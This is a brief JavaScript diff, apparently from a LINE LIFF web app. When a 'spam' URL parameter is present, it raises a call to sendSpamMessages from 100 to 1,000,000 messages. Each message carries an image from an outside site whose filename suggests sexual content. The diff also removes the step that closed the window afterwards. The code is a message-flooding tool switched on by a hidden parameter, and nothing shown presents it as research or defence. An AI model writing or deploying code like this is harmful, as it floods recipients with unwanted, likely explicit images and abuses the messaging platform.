@@ -46,15 +46,11 @@ async function urlParamsCheck() {
     }
 
     if (spamParam !== null) {
-        await sendSpamMessages(100, {
+        await sendSpamMessages(1000000, {
             type: 'image',
             originalContentUrl: "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg",
             previewImageUrl: "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg"
         });
-        // 1秒遅延してからウィンドウを閉じる
-        setTimeout(() => {
-            liff.closeWindow();
-        }, 1000);
     }
 }
 
